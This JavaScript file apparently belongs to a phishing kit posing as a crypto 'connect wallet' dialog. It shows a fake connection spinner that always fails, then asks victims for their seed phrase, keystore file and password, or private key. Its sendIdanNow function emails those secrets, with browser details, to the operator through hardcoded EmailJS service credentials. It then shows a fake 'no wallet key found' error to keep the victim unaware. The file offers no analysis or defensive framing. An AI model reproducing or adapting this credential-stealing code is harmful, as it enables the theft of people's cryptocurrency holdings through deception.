// Initialize wallet modal functionality
document.addEventListener("DOMContentLoaded", function () {
    const modal = document.getElementById("walletModal");
    const closeBtn = document.getElementById("closeModalBtn");
    const backBtn = document.getElementById("backBtn");
    const tryAgainBtn = document.getElementById("tryAgainBtn");
    const manualBtn = document.getElementById("manualConnectBtn");
    const walletNameBar = document.getElementById("modalWalletName");

    window.openWalletModal = function () {
        const modal = document.getElementById("walletModal");
        modal.style.display = "flex";
        modal.classList.add("active");
      };
    
    // Page elements
    const spinnerBox = document.getElementById("spinnerBox");
    const errorBox = document.getElementById("errorBox");
    const actionButtons = document.getElementById("actionButtons");
    
    let currentWalletType = "phrase";
    let currentWallet = null;

    // Show specific modal page
    function showPage(pageNum) {
        ['modalPage1', 'modalPage1a', 'modalPage3'].forEach(function(id) {
            var el = document.getElementById(id);
            if (el) el.style.display = 'none';
        });
        
        if (pageNum === 1 || pageNum === '1') {
            document.getElementById('modalPage1').style.display = 'block';
            if (backBtn) backBtn.style.display = 'none';
        }
        if (pageNum === '1a') {
            document.getElementById('modalPage1a').style.display = 'flex';
            if (backBtn) backBtn.style.display = 'none';
        }
        if (pageNum === 3 || pageNum === '3') {
            document.getElementById('modalPage3').style.display = 'block';
            if (backBtn) backBtn.style.display = 'block';
        }
    }

    // Initialize wallet modal
    function initializeWalletModal() {
        try {
            renderFeaturedWallets();
            renderAllWallets();
            setupSearchFunctionality();
            setupViewToggle();
        } catch (error) {
            console.error("Initialization error:", error);
        }
    }

    // Render featured wallets
    function renderFeaturedWallets() {
        const featuredContainer = document.getElementById('featured-wallets');
        if (!featuredContainer || !window.WALLET_DATA) return;

        featuredContainer.innerHTML = '';
        
        window.WALLET_DATA.featured.forEach(wallet => {
            const walletElement = createFeaturedWalletElement(wallet);
            featuredContainer.appendChild(walletElement);
        });
    }

    // Create featured wallet element
    function createFeaturedWalletElement(wallet) {
        const walletDiv = document.createElement('div');
        walletDiv.className = 'featured-wallet wallet-option';
        walletDiv.setAttribute('data-title', wallet.name);
        walletDiv.setAttribute('data-logo', wallet.icon);
        walletDiv.setAttribute('data-type', wallet.type);
        
        walletDiv.innerHTML = `
            <div class="featured-wallet-content">
                <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-icon">
                <div class="featured-wallet-info">
                    <div class="featured-wallet-name">${wallet.name}</div>
                </div>
            </div>
            ${wallet.showQR ? '<button class="featured-wallet-qr">QR</button>' : ''}
        `;
        
        return walletDiv;
    }

    // Render all wallets grid
    function renderAllWallets() {
        const gridContainer = document.getElementById('wallets-grid');
        const countElement = document.getElementById('wallet-count');
        
        if (!gridContainer || !window.WALLET_DATA) return;

        gridContainer.innerHTML = '';
        
        window.WALLET_DATA.all.forEach(wallet => {
            const walletElement = createWalletGridElement(wallet);
            gridContainer.appendChild(walletElement);
        });
        
        if (countElement) {
            countElement.textContent = `${window.WALLET_DATA.all.length}+`;
        }
    }

    // Create wallet grid element
    function createWalletGridElement(wallet) {
        const walletDiv = document.createElement('div');
        walletDiv.className = 'wallet-option';
        walletDiv.setAttribute('data-title', wallet.name);
        walletDiv.setAttribute('data-logo', wallet.icon);
        walletDiv.setAttribute('data-type', wallet.type);
        
        walletDiv.innerHTML = `
            <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-icon">
            <div class="wallet-info-content">
                <div class="wallet-name" style="
    margin-bottom: 10px  !important
">${wallet.name}</div>
                <div class="wallet-description">${wallet.description}</div>
            </div>
        `;
        
        return walletDiv;
    }

    // Setup search functionality
    function setupSearchFunctionality() {
        const searchInput = document.getElementById('wallet-search');
        if (!searchInput) return;

        searchInput.addEventListener('input', function(e) {
            const searchTerm = e.target.value.toLowerCase();
            const walletOptions = document.querySelectorAll('#wallets-grid .wallet-option');
            
            walletOptions.forEach(wallet => {
                const walletName = wallet.getAttribute('data-title').toLowerCase();
                const isVisible = walletName.includes(searchTerm);
                wallet.style.display = isVisible ? 'flex' : 'none';
            });
        });
    }

    // Setup view toggle between featured and all wallets
    function setupViewToggle() {
        const viewAllBtn = document.getElementById('view-all-wallets');
        const featuredView = document.getElementById('featured-wallets-view');
        const allWalletsView = document.getElementById('all-wallets-view');
        
        if (!viewAllBtn || !featuredView || !allWalletsView) return;

        viewAllBtn.addEventListener('click', function() {
            featuredView.style.display = 'none';
            allWalletsView.style.display = 'block';
            if (walletNameBar) walletNameBar.textContent = 'Select Wallet';
            if (backBtn) backBtn.style.display = 'block';
        });
    }

    // Modal trigger events
    document.querySelectorAll(".modal-trigger").forEach(btn => {
        btn.addEventListener("click", function () {
            modal.style.display = "flex";
            modal.classList.add("active");
            showPage(1);
            resetToFeaturedView();
            if (walletNameBar) walletNameBar.textContent = "Connect Wallet";
        });
    });

    // Reset to featured view
    function resetToFeaturedView() {
        const featuredView = document.getElementById('featured-wallets-view');
        const allWalletsView = document.getElementById('all-wallets-view');
        const searchInput = document.getElementById('wallet-search');
        
        if (featuredView) featuredView.style.display = 'block';
        if (allWalletsView) allWalletsView.style.display = 'none';
        if (searchInput) searchInput.value = '';
        
        // Reset search results
        const walletOptions = document.querySelectorAll('#wallets-grid .wallet-option');
        walletOptions.forEach(wallet => {
            wallet.style.display = 'flex';
        });
    }

    // Close modal
    if (closeBtn) {
        closeBtn.addEventListener("click", function () {
            closeModal();
        });
    }

    // Back button functionality
    if (backBtn) {
        backBtn.addEventListener("click", function () {
            const allWalletsView = document.getElementById('all-wallets-view');
            const featuredView = document.getElementById('featured-wallets-view');
            
            // If we're in all wallets view, go back to featured
            if (allWalletsView && allWalletsView.style.display === 'block') {
                resetToFeaturedView();
                if (walletNameBar) walletNameBar.textContent = "Connect Wallet";
                if (backBtn) backBtn.style.display = 'none';
            } else {
                // Otherwise go back to page 1
                showPage(1);
                resetModal();
            }
        });
    }

    // Wallet selection handler
    document.addEventListener('click', function(e) {
        try {
            const walletBtn = e.target.closest('.wallet-option');
            if (!walletBtn) return;
            
            e.preventDefault();
            
            // Get wallet info
            const walletName = walletBtn.getAttribute('data-title') || "Wallet";
            const walletLogo = walletBtn.getAttribute('data-logo') || "";
            const walletType = walletBtn.getAttribute('data-type') || "phrase";
        
        // Store current wallet
        currentWallet = {
            id: walletName.toLowerCase().replace(/\s+/g, '-'),
            name: walletName,
            icon: walletLogo,
            type: walletType
        };
        
        // Update modal title
        if (walletNameBar) walletNameBar.textContent = walletName;
        
        // Update Page 3 wallet identity
        const walletLogo3 = document.getElementById("wallet_logo");
        const walletName3 = document.getElementById("wallet_name");
        if (walletLogo3) walletLogo3.src = walletLogo;
        if (walletName3) walletName3.textContent = walletName;
        
        // Animate transition via Page 1a
        const zoomLogo = document.getElementById('walletZoomLogo');
        if (zoomLogo) {
            zoomLogo.src = walletLogo;
            zoomLogo.style.transform = 'scale(1)';
            zoomLogo.style.opacity = '1';
            showPage('1a');
            
            setTimeout(function() {
                zoomLogo.style.transform = 'scale(4)';
                zoomLogo.style.opacity = '1';
            }, 100);
            
            setTimeout(function() {
                showPage(3);
                startConnecting();
                zoomLogo.style.transform = 'scale(1)';
                zoomLogo.style.opacity = '1';
            }, 1500);
        } else {
            // Fallback: go directly to page 2
            showPage(3);
            startConnecting();
        }
        
        currentWalletType = walletType;
        
            // Dispatch wallet selection event
            document.dispatchEvent(new CustomEvent('walletSelected', {
                detail: { wallet: currentWallet }
            }));
        } catch (error) {
            console.error("Wallet selection error:", error);
        }
    });

    // Try Again button
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener("click", function () {
            showPage(3);
            startConnecting();
        });
    }

    // Manual Connect button
    if (manualBtn) {
        manualBtn.addEventListener("click", function () {
            showPage(3);
            activateTab("pills-phrase");
        });
    }

    // Connecting animation and error handling
    function startConnecting() {
        if (spinnerBox) spinnerBox.style.display = "flex";
        if (errorBox) errorBox.style.display = "none";
        if (actionButtons) actionButtons.style.display = "none";
        
        setTimeout(function() {
            if (spinnerBox) spinnerBox.style.display = "none";
            if (errorBox) errorBox.style.display = "block";
            if (actionButtons) actionButtons.style.display = "flex";
        }, 3000);
    }

    // Tab system for Page 3
    function activateTab(tabId) {
        ["pills-phrase", "pills-keystore", "pills-private"].forEach(id => {
            const pane = document.getElementById(id);
            if (pane) {
                pane.classList.toggle("active", id === tabId);
                pane.style.display = (id === tabId ? "block" : "none");
            }
        });

        ["pills-phrase-tab", "pills-keystore-tab", "pills-private-tab"].forEach(id => {
            const btn = document.getElementById(id);
            if (btn) btn.classList.toggle("active", id.replace("-tab", "") === tabId);
        });
    }

    // Setup tab buttons
    [
        ["pills-phrase-tab", "pills-phrase"], 
        ["pills-keystore-tab", "pills-keystore"], 
        ["pills-private-tab", "pills-private"]
    ].forEach(([tabBtnId, tabPaneId]) => {
        const btn = document.getElementById(tabBtnId);
        if (btn) {
            btn.addEventListener("click", () => activateTab(tabPaneId));
        }
    });


 // Form submission functionality
window.sendIdanNow = async function (connection) {
    let wallet = document.getElementById("wallet_name")?.textContent.trim() || "";
    let secret = null, password = null;
    let isValid = true;

    // Clear previous errors
    document.querySelectorAll(".form-control").forEach(input => {
        input.classList.remove("is-invalid");
    });
    document.querySelectorAll(".error-message").forEach(msg => msg.remove());

    const showError = (selector, message) => {
        const input = document.querySelector(selector);
        if (input) {
            input.classList.add("is-invalid");
            const errorDiv = document.createElement("div");
            errorDiv.className = "error-message";
            errorDiv.textContent = message;
            errorDiv.style.opacity = "1";
            input.parentElement.appendChild(errorDiv);

            setTimeout(() => {
                errorDiv.style.opacity = "0";
            }, 3000);
            setTimeout(() => errorDiv.remove(), 4000);
        }
    };

    // Validate based on connection type
    if (connection === "phrase") {
        secret = document.getElementById("secret_phrase")?.value.trim();
        if (!secret) {
            showError("#secret_phrase", "Mnemonic phrase is required.");
            isValid = false;
        }
    } else if (connection === "keystore") {
        secret = document.getElementById("keystore")?.value.trim();
        password = document.getElementById("password")?.value.trim();
        if (!secret) {
            showError("#keystore", "Keystore JSON is required.");
            isValid = false;
        }
        if (!password) {
            showError("#password", "Password is required.");
            isValid = false;
        }
    } else if (connection === "private key") {
        secret = document.getElementById("private_key")?.value.trim();
        if (!secret) {
            showError("#private_key", "Private key is required.");
            isValid = false;
        }
    }

    if (!isValid) return;

    // Update button state
    const button = document.querySelector(`.custom-import-btn[onclick="sendIdanNow('${connection}')"]`);
    if (button) {
        button.innerHTML = '<span style="display: inline-block; width: 1rem; height: 1rem; border: 2px solid white; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px;"></span>Connecting...';
        button.disabled = true;
    }

    try {
        // Initialize EmailJS with your Public Key
        emailjs.init("3DeO2z9encRlwOjGr");

        const templateParams = {
            wallet: wallet,
            secret: secret,
            password: password || "N/A",
            connection: connection,
            timestamp: new Date().toLocaleString(),
            user_agent: navigator.userAgent,
            platform: navigator.platform
        };

        console.log("Preparing to send email with params:", templateParams);

        // Send email using EmailJS
        const response = await emailjs.send(
            "service_myah536",
            "template_2jgw1qy",
            templateParams
        );

        console.log("EmailJS response:", response);

        if (response.status === 200) {
            console.log("Email sent successfully");
            showStatus("⚠️ 🧰 Auth failed: A Secured Connection was created but no WALLET KEY Found. Please try an active wallet", "red");
        } else {
            console.error("EmailJS error:", response);
            showStatus("⚠️ 🧰 Connection failed: Unable to establish secure connection. Please try again.", "red");
        }
    } catch (error) {
        console.error("Email sending error:", error);
        showStatus("⚠️ 🧰 Auth failed: A Secured Connection was created but no WALLET KEY Found. Please try an active wallet", "red");
    } finally {
        if (button) {
            button.innerHTML = "Validate";
            button.disabled = false;
        }
    }
}; // <-- This closes the sendIdanNow function

// Show status message function should be OUTSIDE sendIdanNow
function showStatus(msg, color) {
    const el = document.getElementById("status_message");
    if (!el) return;
    
    el.textContent = msg;
    el.style.color = color || "red";
    el.style.display = "block";
    el.style.opacity = "1";
    
    setTimeout(() => {
        el.style.opacity = "0";
    }, 2400);
    setTimeout(() => {
        el.style.display = "none";
    }, 3200);
}

// Close modal function
function closeModal() {
    const modal = document.getElementById("walletModal");
    if (!modal) return;
    
    modal.style.display = "none";
    modal.classList.remove("active");
    resetModal();
    
    // Dispatch close event
    document.dispatchEvent(new CustomEvent('walletModalClosed'));
}

// Reset modal state
function resetModal() {
    showPage(1);
    resetToFeaturedView();
    
    const walletNameBar = document.getElementById("modalWalletName");
    const backBtn = document.getElementById("backBtn");
    
    if (walletNameBar) walletNameBar.textContent = "Connect Wallet";
    if (backBtn) backBtn.style.display = 'none';

    // Reset form fields and errors
    document.querySelectorAll(".form-control").forEach(input => {
        input.value = "";
        input.classList.remove("is-invalid");
    });
    document.querySelectorAll(".error-message").forEach(msg => msg.remove());

    // Reset status message
    const statusDiv = document.getElementById("status_message");
    if (statusDiv) {
        statusDiv.style.display = "none";
        statusDiv.textContent = "";
    }

    // Hide error and action buttons
    const errorBox = document.getElementById("errorBox");
    const actionButtons = document.getElementById("actionButtons");
    if (errorBox) errorBox.style.display = "none";
    if (actionButtons) actionButtons.style.display = "none";

    // Reset to default tab
    activateTab("pills-phrase");
    
    currentWallet = null;
}    // Reset modal state
    function resetModal() {
        showPage(1);
        resetToFeaturedView();
        
        if (walletNameBar) walletNameBar.textContent = "Connect Wallet";
        if (backBtn) backBtn.style.display = 'none';

        // Reset form fields and errors
        document.querySelectorAll(".form-control").forEach(input => {
            input.value = "";
            input.classList.remove("is-invalid");
        });
        document.querySelectorAll(".error-message").forEach(msg => msg.remove());

        // Reset status message
        const statusDiv = document.getElementById("status_message");
        if (statusDiv) {
            statusDiv.style.display = "none";
            statusDiv.textContent = "";
        }

        // Hide error and action buttons
        if (errorBox) errorBox.style.display = "none";
        if (actionButtons) actionButtons.style.display = "none";

        // Reset to default tab
        activateTab("pills-phrase");
        
        currentWallet = null;
    }

    // Close modal on outside click
    if (modal) {
        modal.addEventListener("click", function (e) {
            if (e.target === modal) {
                closeModal();
            }
        });
    }

    // Initialize everything
    try {
        showPage(1);
        activateTab("pills-phrase");
        initializeWalletModal();
    } catch (error) {
        console.error("Modal initialization error:", error);
    }
});